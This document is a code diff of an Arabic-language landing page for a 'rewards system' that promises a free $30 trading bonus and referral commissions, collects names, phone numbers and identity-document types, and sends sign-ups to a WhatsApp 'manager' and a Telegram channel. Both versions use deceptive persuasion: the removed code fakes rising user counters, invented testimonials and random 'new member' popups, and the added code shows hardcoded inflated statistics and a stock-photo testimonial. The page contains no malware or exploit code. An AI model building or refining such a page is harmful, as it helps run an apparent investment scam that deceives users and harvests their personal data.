@@ -2,8 +2,10 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام المكافآت الذكي | المنصة الرسمية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <title>نظام المكافآت الذكي | بونص 30$ وبرنامج إحالة مربح</title>
+    <meta name="description" content="سجل الآن واحصل على بونص 30$ مجاناً، واربح عمولات ضخمة عن كل صديق تدعوه للانضمام. تداول ممول ونظام شركاء متكامل.">
     
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -13,6 +15,7 @@
     <style>
         :root { 
             --primary: #22c55e; 
+            --gold: #fbbf24;
             --primary-glow: rgba(34, 197, 94, 0.2);
             --bg: #020617; 
             --card-bg: rgba(15, 23, 42, 0.9);
@@ -42,11 +45,20 @@
         }
 
         .section-title { color: var(--primary); font-size: 1.4rem; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; font-weight: 900;}
+        .gold-title { color: var(--gold); }
+
+        /* قسم الإحالة المخصص */
+        .referral-box {
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(251, 191, 36, 0.05));
+            border: 1px dashed var(--gold); border-radius: 15px; padding: 20px; margin-top: 15px;
+        }
+        .referral-item { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; font-size: 0.95rem; }
+        .referral-item i { color: var(--gold); font-size: 1.2rem; }
 
         /* العدادات */
         .stats-container { display: flex; justify-content: space-around; text-align: center; margin-bottom: 25px; }
-        .stat-box h3 { margin: 0; color: var(--primary); font-size: 2rem; font-weight: 900; }
-        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.8rem; }
+        .stat-box h3 { margin: 0; color: var(--primary); font-size: 1.8rem; font-weight: 900; }
+        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.75rem; }
 
         /* الفورم */
         .form-group { margin-bottom: 18px; position: relative; }
@@ -64,193 +76,146 @@
         }
         .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 25px var(--primary-glow); }
 
-        /* تعديلات مكتبة الهاتف - إظهار الأسماء والرموز */
+        /* مكتبة الهاتف */
         .iti { width: 100%; }
-        .iti__country-list { 
-            background-color: #0f172a !important; 
-            color: white !important; 
-            border: 1px solid #475569 !important;
-            border-radius: 10px !important;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8) !important;
-            max-width: 320px !important;
-            z-index: 10000 !important;
-            text-align: left !important; /* لضمان ظهور الاسم والرمز بجانب بعض */
-        }
-        .iti__country { padding: 10px !important; outline: none !important; }
-        .iti__country-name { color: #f1f5f9 !important; font-family: 'Tajawal', sans-serif; font-size: 0.9rem; }
-        .iti__dial-code { color: #94a3b8 !important; margin-left: 5px; }
-        .iti__flag-box { margin-right: 10px; }
-        .iti__selected-flag { background: rgba(255,255,255,0.05) !important; border-radius: 10px 0 0 10px; padding: 0 15px !important; }
+        .iti__country-list { background-color: #0f172a !important; color: white !important; z-index: 10000 !important; text-align: left !important; }
 
         /* تجارب المستخدمين */
         .user-review { padding: 15px 0; border-bottom: 1px solid var(--border); display: flex; gap: 15px; align-items: center; }
         .u-img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
 
-        /* التواصل */
-        .contact-btn { 
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 10px; 
-            text-decoration: none; color: #fff; font-weight: 700;
-        }
-
-        .whatsapp-float { position:fixed; bottom:25px; right:25px; background:#25D366; color:white; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; font-size: 30px; z-index: 1000; box-shadow: 0 5px 20px rgba(0,0,0,0.5);}
-        #notify { position:fixed; bottom:25px; left:25px; background: var(--card-bg); padding:12px; border-radius:12px; display:none; border-right: 4px solid var(--primary); z-index: 999; font-size: 0.85rem; font-weight: bold; box-shadow: 0 10px 25px rgba(0,0,0,0.5);}
+        /* تذييل الصفحة */
+        footer { text-align: center; padding: 30px; color: var(--text-dim); font-size: 0.8rem; border-top: 1px solid var(--border); margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="urgent-bar"><i class="fas fa-bolt"></i> عرض محدود: متبقي 7 مقاعد فقط للحصول على بونص 30$ مجاناً!</div>
+<div class="urgent-bar"><i class="fas fa-fire"></i> نظام المكافآت: استلم 30$ بونص + 5$ عن كل صديق تدعوه!</div>
 
 <div class="container">
     <div style="text-align:center; padding: 25px 0;">
-        <h1 style="font-size: 2.2rem; margin-bottom: 5px; font-weight: 900; color: #fff;">نظام المكافآت الذكي 🚀</h1>
-        <p style="color: var(--text-dim);">سجل بياناتك واستلم رأس مال التداول فوراً</p>
+        <h1 style="font-size: 2.2rem; margin-bottom: 5px; font-weight: 900;">المنصة الرسمية للمكافآت 🚀</h1>
+        <p style="color: var(--text-dim);">تداول برأس مالنا.. واربح من دعوة أصدقائك</p>
     </div>
 
     <div class="stats-container">
-        <div class="stat-box"><h3 id="uCount">0</h3><p>مشترك</p></div>
-        <div class="stat-box"><h3 id="cCount">0</h3><p>دولة</p></div>
-        <div class="stat-box"><h3 id="pCount">0</h3><p>أرباح $</p></div>
+        <div class="stat-box"><h3>+3.5k</h3><p>مستخدم نشط</p></div>
+        <div class="stat-box"><h3>$50k+</h3><p>عمولات الإحالة</p></div>
+        <div class="stat-box"><h3>24/7</h3><p>دعم فني</p></div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-id-card"></i> استمارة التسجيل</div>
+        <div class="section-title gold-title"><i class="fas fa-users"></i> برنامج "شارك واربح"</div>
+        <p style="font-size: 0.95rem;">لا يكتفي النظام بمنحك بونص تداول، بل يمكنك بناء دخل سلبي مستمر:</p>
+        
+        <div class="referral-box">
+            <div class="referral-item">
+                <i class="fas fa-gift"></i>
+                <span><b>5$ مكافأة فورية</b> عن كل صديق يسجل ويقوم بتفعيل حسابه.</span>
+            </div>
+            <div class="referral-item">
+                <i class="fas fa-chart-line"></i>
+                <span><b>10% عمولة تداول</b> من أرباح أصدقائك (لا تنقص من أرباحهم شيئاً).</span>
+            </div>
+            <div class="referral-item">
+                <i class="fas fa-wallet"></i>
+                <span><b>سحب فوري:</b> يمكنك سحب عمولات الإحالة مباشرة عبر USDT أو باير.</span>
+            </div>
+        </div>
+        <p style="font-size: 0.85rem; color: var(--text-dim); margin-top: 15px; text-align: center;">
+            * تحصل على رابط الإحالة الخاص بك فور إتمام تسجيلك وتفعيل الوثيقة.
+        </p>
+    </div>
+
+    <div class="glass-card">
+        <div class="section-title"><i class="fas fa-user-plus"></i> افتح حساب مكافآت مجاني</div>
         
         <div class="form-group">
-            <label>الاسم الكامل</label>
-            <input type="text" id="name" placeholder="ادخل اسمك الثلاثي">
+            <label>الاسم الكامل (مطابق للهوية)</label>
+            <input type="text" id="name" placeholder="مثال: محمد أحمد علي">
         </div>
 
         <div class="form-group">
-            <label>دولة الإقامة</label>
-            <select id="countrySelect" onchange="toggleOther(this)">
-                <option value="">-- اختر دولتك --</option>
+            <label>الدولة</label>
+            <select id="countrySelect">
                 <option value="اليمن">اليمن</option>
                 <option value="السعودية">السعودية</option>
-                <option value="الإمارات">الإمارات</option>
                 <option value="مصر">مصر</option>
-                <option value="الكويت">الكويت</option>
-                <option value="عمان">عمان</option>
+                <option value="الإمارات">الإمارات</option>
+                <option value="العراق">العراق</option>
                 <option value="Other">دولة أخرى...</option>
             </select>
-            <input type="text" id="otherCountry" style="display:none; margin-top:10px;" placeholder="اكتب اسم دولتك هنا">
         </div>
 
         <div class="form-group">
-            <label>رقم الهاتف (سيصلك كود التفعيل عليه)</label>
+            <label>رقم الهاتف</label>
             <input type="tel" id="phone">
         </div>
 
         <div class="form-group">
-            <label>الوثيقة المتوفرة لديك</label>
+            <label>الوثيقة المتوفرة</label>
             <select id="doc">
-                <option value="">-- اختر نوع الوثيقة --</option>
-                <option>البطاقة الشخصية (هوية)</option>
+                <option>البطاقة الشخصية</option>
                 <option>جواز السفر</option>
                 <option>رخصة قيادة</option>
             </select>
         </div>
 
-        <button class="btn-main" onclick="submitData()" id="sendBtn">إرسال وتفعيل البونص ✅</button>
+        <button class="btn-main" onclick="submitData()" id="sendBtn">تسجيل واستلام البونص ✅</button>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-check-circle"></i> آخر المشتركين المقبولين</div>
-        <div id="reviewsContainer"></div>
+        <div class="section-title"><i class="fas fa-comments"></i> ماذا يقول شركاؤنا؟</div>
+        <div id="reviewsContainer">
+            <div class="user-review">
+                <img src="https://randomuser.me/api/portraits/men/32.jpg" class="u-img">
+                <div>
+                    <strong>فؤاد منصور - اليمن</strong>
+                    <p style="font-size: 0.85rem; color: #cbd5e1;">"البونص حقيقي، والأجمل أنني سحبت 45$ عمولات إحالة فقط خلال أسبوع!"</p>
+                </div>
+            </div>
+        </div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-headset"></i> هل تحتاج مساعدة؟</div>
-        <a href="https://wa.me/967739399064" class="contact-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i> مراسلة المدير مباشرة</a>
-        <a href="https://t.me/A_VIP_B" class="contact-btn" style="background:#0088cc;"><i class="fab fa-telegram-plane"></i> انضم لقناة النتائج</a>
+        <div class="section-title"><i class="fas fa-headset"></i> الدعم الفني</div>
+        <a href="https://wa.me/967739399064" style="background:#25D366; color:white; text-decoration:none; display:flex; justify-content:center; padding:15px; border-radius:12px; font-weight:bold; margin-bottom:10px;">
+            <i class="fab fa-whatsapp" style="margin-left:10px;"></i> مراسلة المدير لتفعيل الحساب
+        </a>
     </div>
 
-    <p style="text-align:center; font-size:0.8rem; color:var(--text-dim);">© 2026 جميع الحقوق محفوظة لشبكة سكاي نت ميديا</p>
+    <footer>
+        <p>© 2026 شبكة سكاي نت ميديا | جميع الحقوق محفوظة</p>
+        <p style="font-size: 0.7rem;">نظام المكافآت يخضع لشروط الاستخدام العادل</p>
+    </footer>
 </div>
-
-<a class="whatsapp-float" href="https://wa.me/967739399064"><i class="fab fa-whatsapp"></i></a>
-<div id="notify"></div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // تهيئة حقل الهاتف مع تعريب أسماء الدول
+    // تهيئة الهاتف
     const pInput = document.querySelector("#phone");
     const iti = window.intlTelInput(pInput, {
         separateDialCode: true,
         initialCountry: "auto",
-        // تعريب أسماء الدول المهمة في القائمة
-        localizedCountries: {
-            'ye': 'اليمن',
-            'sa': 'السعودية',
-            'ae': 'الإمارات',
-            'eg': 'مصر',
-            'kw': 'الكويت',
-            'om': 'عمان',
-            'qa': 'قطر',
-            'jo': 'الأردن',
-            'iq': 'العراق',
-            'ma': 'المغرب',
-            'dz': 'الجزائر',
-            'tn': 'تونس',
-            'ly': 'ليبيا',
-            'sd': 'السودان',
-            'ps': 'فلسطين',
-            'sy': 'سوريا',
-            'lb': 'لبنان'
-        },
         geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)).catch(() => s("YE")),
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
         dropdownContainer: document.body
     });
 
-    // تشغيل العدادات
-    let u=0, c=0, p=0;
-    setInterval(()=>{ if(u<3150) {u+=35; document.getElementById('uCount').innerText = "+"+u;} }, 40);
-    setInterval(()=>{ if(c<22) {c++; document.getElementById('cCount').innerText = c;} }, 150);
-    setInterval(()=>{ if(p<18000) {p+=200; document.getElementById('pCount').innerText = "+"+p;} }, 30);
-
-    function toggleOther(s) { document.getElementById('otherCountry').style.display = (s.value==='Other')?'block':'none'; }
-
-    // عرض تجارب المستخدمين بأسماء وصور عربية
-    const revs = [
-        {n:"عصام الحبيشي", c:"اليمن", img:"https://randomuser.me/api/portraits/men/32.jpg", t:"النظام ممتاز جداً، استلمت البونص وبدأت أول صفقة ذهب بنجاح."},
-        {n:"نورة القحطاني", c:"السعودية", img:"https://randomuser.me/api/portraits/women/44.jpg", t:"شكراً للأستاذ محمد على الدعم، الحساب تفعل في أقل من ساعة."},
-        {n:"أحمد المصري", c:"مصر", img:"https://randomuser.me/api/portraits/men/65.jpg", t:"أفضل منصة تداول ممول جربتها، المصداقية 100%."}
-    ];
-    document.getElementById('reviewsContainer').innerHTML = revs.map(r=>`
-        <div class="user-review">
-            <img src="${r.img}" class="u-img">
-            <div><strong>${r.n} - ${r.c}</strong><p style="margin:5px 0; font-size:0.85rem; color:#cbd5e1;">"${r.t}"</p></div>
-        </div>
-    `).join('');
-
-    // إشعارات عشوائية في الأسفل
-    const names = ["خالد", "عبدالله", "مريم", "هاني", "ليلى", "سلطان"];
-    setInterval(() => {
-        const notify = document.getElementById("notify");
-        notify.innerHTML = `🔥 انضم الآن <span style="color:#22c55e;">${names[Math.floor(Math.random()*names.length)]}</span> وتم منحه المكافأة!`;
-        notify.style.display = "block";
-        setTimeout(()=> notify.style.display="none", 4500);
-    }, 12000);
-
-    // دالة الإرسال
     async function submitData() {
         const btn = document.getElementById("sendBtn");
-        const nameVal = document.getElementById("name").value.trim();
-        const phoneVal = iti.getNumber();
-        
-        if(!nameVal || nameVal.length < 5) return alert("يرجى كتابة الاسم الكامل");
-        if(!iti.isValidNumber()) return alert("يرجى إدخال رقم هاتف صحيح");
+        const name = document.getElementById("name").value;
+        if(!name || name.length < 4) return alert("يرجى إدخال الاسم الكامل");
 
+        btn.disabled = true; btn.innerText = "جاري المعالجة...";
+        
         const data = {
-            name: nameVal,
-            country: document.getElementById("countrySelect").value === 'Other' ? document.getElementById("otherCountry").value : document.getElementById("countrySelect").value,
-            phone: phoneVal,
+            name: name,
+            country: document.getElementById("countrySelect").value,
+            phone: iti.getNumber(),
             doc: document.getElementById("doc").value
         };
 
-        btn.disabled = true; btn.innerText = "جاري مراجعة البيانات...";
-        
         try {
             const res = await fetch("/api/register", {
                 method: "POST",
@@ -258,13 +223,11 @@
                 body: JSON.stringify(data)
             });
             if(res.ok) {
-                alert("تم استلام طلبك بنجاح! سيتم تحويلك الآن لتأكيد التفعيل.");
+                alert("تم التسجيل! تواصل مع الإدارة لاستلام بونص الـ 30$ ورابط الإحالة الخاص بك.");
                 window.location.href = "https://t.me/A_VIP_B";
-            } else {
-                alert("حدث خطأ، حاول مرة أخرى أو تواصل معنا واتساب.");
             }
-        } catch(e) { alert("تأكد من اتصالك بالإنترنت"); }
-        finally { btn.disabled = false; btn.innerText = "إرسال وتفعيل البونص ✅"; }
+        } catch(e) { alert("خطأ في الاتصال بالسيرفر"); }
+        finally { btn.disabled = false; btn.innerText = "تسجيل واستلام البونص ✅"; }
     }
 </script>
 </body>
